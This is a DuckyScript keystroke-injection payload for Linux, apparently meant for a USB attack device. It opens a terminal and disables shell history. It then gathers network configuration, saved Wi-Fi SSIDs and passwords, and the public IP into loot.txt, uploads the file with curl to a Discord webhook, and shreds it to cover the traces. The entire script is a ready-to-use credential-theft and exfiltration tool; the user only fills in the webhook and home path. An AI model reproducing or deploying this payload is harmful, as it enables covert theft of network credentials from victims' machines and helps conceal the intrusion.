REM TITLE: Network Credentials Exfil Linux
REM AUTHOR: OSINTI4L
REM TARGET OS: Linux (tested on Kali Linux)
REM DESCRIPTION: Enumerates and exfiltrates credentials for: networking interfaces, wireless network interfaces, NetworkManager connections, connected wireless network SSID and password, and IP logs public IP address. The results are written to "loot.txt" and then exfiltrated via Discord webhook. It then obfuscates itself by shredding "loot.txt" and closing terminal; terminal session history is disabled at beginning of payload. To work: place Discord webhook to line 20 and configure home directory path to line 22.

REM Opening terminal and disabling terminal session history:
CTRL ALT t
    DELAY 150
STRINGLN unset HISTFILE

REM Enumerating network information, copying wireless network credentials, and IP logging public IP address > writing to "loot.txt":
STRINGLN iwconfig > loot.txt; ifconfig >> loot.txt; nmcli connection show >> loot.txt; nmcli >> loot.txt; nmcli dev wifi show-password >> loot.txt; echo "Public IP Address Logged:" >> loot.txt; curl https://api.ipify.org >> loot.txt
    DELAY 300

REM Exfiltrating "loot.txt" via Discord webhook:
DEFINE WEBHOOK_URL https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK
    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
    STRINGLN -F "file=@/home/ENTER_USER/loot.txt" \
    STRINGLN -F "content=$ Loot Incoming $" \
    STRINGLN WEBHOOK_URL
        DELAY 100

REM Obfuscation stage, shred "loot.txt" and exit:
STRINGLN shred -fu loot.txt
	STRINGLN exit
